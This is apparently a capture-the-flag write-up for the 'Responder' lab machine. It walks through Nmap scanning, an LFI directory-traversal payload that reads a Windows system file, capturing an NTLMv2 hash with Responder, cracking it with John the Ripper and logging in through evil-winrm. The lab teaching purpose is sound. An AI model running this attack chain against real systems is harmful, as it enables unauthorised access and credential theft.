Responder
Nmap Enumeration

Ping was performed on the target:

ping 10.129.96.108

The host appeared to be online.

A normal Nmap scan was slow and unresponsive, suggesting the presence of filtering or firewall rules. Therefore, a SYN scan with host discovery disabled was used.

nmap -sS -T4 --top-ports 1000 -Pn 10.129.96.108
Results
80/tcp   open  http
5985/tcp open  WinRM

To identify service versions:

nmap -sV -Pn 10.129.96.108

The target was identified as a Windows host.

Web Enumeration

Accessing the website through the IP address did not display the expected content.

Checking the HTTP headers:

curl -I http://10.129.96.108

Further testing revealed references to a domain named:

unika.htb

This suggested that the web server was using virtual hosting and expected requests containing the correct hostname.

Host File Configuration

The hostname was added to the local hosts file.

sudo nano /etc/hosts

Add:

10.129.96.108    unika.htb

Testing:

curl http://unika.htb/

The website now loaded correctly.

Local File Inclusion Discovery

The application contained a parameter used to load language pages.

Testing showed that the parameter was vulnerable to Local File Inclusion (LFI).

Example:

http://unika.htb/?page=../../../../windows/system32/drivers/etc/hosts

The application returned local file contents.

Vulnerability Analysis

Attack chain:

User Input
    ↓
No Input Validation
    ↓
Directory Traversal
    ↓
Local File Inclusion
    ↓
Sensitive File Access

The vulnerability allowed reading files from the server but did not immediately provide credentials.

Capturing NTLM Authentication

To obtain credentials, the server was forced to access an attacker-controlled network resource.

Responder was started:

sudo responder -I tun0

The vulnerable parameter was used to request a file from the attacker's system.

This caused the target to authenticate over SMB and leak an NTLMv2 hash.

Responder successfully captured the authentication hash.

Password Cracking

The captured hash was cracked using John the Ripper.

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Valid credentials were recovered.

WinRM Access

Using the recovered credentials, a connection was established through WinRM.

evil-winrm -i 10.129.96.108 -u <username> -p <password>

After successful authentication:

whoami

The user context was confirmed.

Flag Retrieval

Navigate to the user's desktop:

cd C:\Users\<username>\Desktop

Read the flag:

type user.txt
